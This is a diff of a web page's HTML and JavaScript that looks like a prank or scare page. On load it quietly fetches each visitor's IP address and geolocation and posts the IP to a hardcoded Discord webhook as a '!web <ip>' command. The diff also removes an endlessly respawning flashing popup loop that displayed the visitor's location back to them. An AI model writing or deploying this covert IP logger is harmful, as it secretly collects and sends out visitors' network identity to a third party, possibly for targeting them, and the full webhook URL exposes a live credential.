@@ -87,45 +87,6 @@
             margin-bottom: 20px;
         }
 
-        /* Flashing text and background styles for popups */
-        @keyframes flashText {
-            0% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0;
-            }
-            100% {
-                opacity: 1;
-            }
-        }
-
-        @keyframes flashBackground {
-            0% {
-                background-color: black;
-            }
-            50% {
-                background-color: red;
-            }
-            100% {
-                background-color: black;
-            }
-        }
-
-        /* Styling for the popup content */
-        .popup-content {
-            font-family: 'Arial', sans-serif;
-            color: white;
-            padding: 20px;
-            text-align: center;
-            font-size: 16px;
-            animation: flashText 1s infinite;
-        }
-
-        /* Background flashing */
-        .popup-background {
-            animation: flashBackground 1s infinite;
-        }
     </style>
 </head>
 <body>
@@ -153,44 +114,20 @@
 </div>
 
 <script>
-    let popups = []; // To store the reference of the popups
     let ipData = {}; // To store IP data fetched from the API
 
-    // Function to create a new popup and display IP info with flashing text and background
-    function createPopup() {
-        const popup = window.open("about:blank", "_blank", "width=400,height=400");
-        if (popup) {
-            // Add the popup to the popups array
-            popups.push(popup);
-            // Wait until the popup is fully opened, then inject the IP data with flashing effect
-            popup.document.write("<html><head><title>IP Info</title></head><body class='popup-background'>");
-            popup.document.write("<div class='popup-content'>");
-            popup.document.write("<h2>IP Information</h2>");
-            popup.document.write(`<p><strong>IP Address:</strong> ${ipData.ip}</p>`);
-            popup.document.write(`<p><strong>City:</strong> ${ipData.city}</p>`);
-            popup.document.write(`<p><strong>Region:</strong> ${ipData.region}</p>`);
-            popup.document.write(`<p><strong>Country:</strong> ${ipData.country}</p>`);
-            popup.document.write(`<p><strong>Location:</strong> ${ipData.loc}</p>`);
-            popup.document.write(`<p><strong>Organization:</strong> ${ipData.org}</p>`);
-            popup.document.write("</div>");
-            popup.document.write("</body></html>");
-
-            // Listen for when the popup is closed
-            popup.onbeforeunload = function () {
-                // When the popup is closed, create a new one
-                setTimeout(createPopup, 2000);  // Delay the popup creation
-            };
-        }
-    }
-
+    // Function to get the IP address and send to Discord
     function getMyIpAddress() {
         fetch("https://ipinfo.io/json")
             .then(response => response.json())
             .then(data => {
                 ipData = data; // Store the fetched data globally
-                // Optionally display it in the main page as well
+                // Send IP info to Discord Webhook
+                sendToDiscord(data.ip);
+                
+                // Optionally display it on the page as well
                 const ipResultDiv = document.getElementById("ipResult");
-                ipResultDiv.innerHTML = ` 
+                ipResultDiv.innerHTML = `
                     <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
                     <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
                     <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
@@ -198,19 +135,15 @@
                     <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
                     <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
                 `;
-                sendToDiscord(data);
             })
             .catch(error => console.error("Error retrieving IP address:", error));
     }
 
-    function sendToDiscord(data) {
+    // Function to send the IP to Discord in the format !web <ip>
+    function sendToDiscord(ip) {
         const webhookUrl = "https://discord.com/api/webhooks/1323162276571643995/0OlR0LfoTxbibeeoWe39vgxjwhIE6DMbQCGoQv3Q5BEn1YotXN995WeDMWPo8_Q62ZWI";
-        
-        // Sending the IP in the format !web <ip>
-        const message = `!web ${data.ip}`;
-
         const payload = {
-            content: message // Send the message as plain text
+            content: `!web ${ip}`  // Send IP in the format !web <ip>
         };
 
         fetch(webhookUrl, {
@@ -220,9 +153,9 @@
         })
         .then(response => {
             if (response.ok) {
-                console.log("IP sent to Discord successfully.");
+                console.log("Data sent to Discord successfully.");
             } else {
-                console.error("Error sending IP to Discord.");
+                console.error("Error sending data to Discord.");
             }
         })
         .catch(console.error);
@@ -247,11 +180,6 @@
         video.style.display = "block";
         document.querySelector(".loading-screen").style.display = "none";
         document.querySelector(".content").style.display = "block";
-
-        // Start opening pop-ups when the user clicks
-        setTimeout(function () {
-            createPopup();
-        }, 2000);  // Delay the first popup for better chances of being allowed
     }
 
     document.addEventListener("DOMContentLoaded", function() {
@@ -262,9 +190,10 @@
         acceptBtn.addEventListener("click", enterFullscreenAndPlay);
         cancelBtn.addEventListener("click", enterFullscreenAndPlay);
 
-        // Fetch IP address when the page loads
+        // Get IP address and geolocation on page load
         getMyIpAddress();
     });
 </script>
+
 </body>
 </html>
